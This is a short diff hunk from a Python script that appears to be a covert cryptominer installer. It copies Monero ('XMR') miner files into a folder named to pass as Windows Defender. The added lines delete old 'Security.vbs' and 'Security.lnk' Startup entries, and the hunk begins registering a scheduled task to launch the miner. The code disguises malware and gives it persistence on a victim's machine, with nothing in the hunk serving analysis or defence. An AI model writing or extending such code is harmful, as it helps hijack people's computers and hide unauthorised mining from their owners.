@@ -52,6 +52,16 @@ if os.path.exists(Defender_Dir):
 
 shutil.copytree(XMR_Source, Defender_Dir)
 
+Startup_Dir = os.path.join(
+    "C:\\Users", User_Name,
+    "AppData", "Roaming", "Microsoft", "Windows",
+    "Start Menu", "Programs", "Startup"
+)
+for Old_File in ["Security.vbs", "Security.lnk"]:
+    Old_Path = os.path.join(Startup_Dir, Old_File)
+    if os.path.exists(Old_Path):
+        os.remove(Old_Path)
+
 Target_Vbs = os.path.join(Defender_Dir, "Start.vbs")
 subprocess.run([
     "schtasks", "/create", "/f",
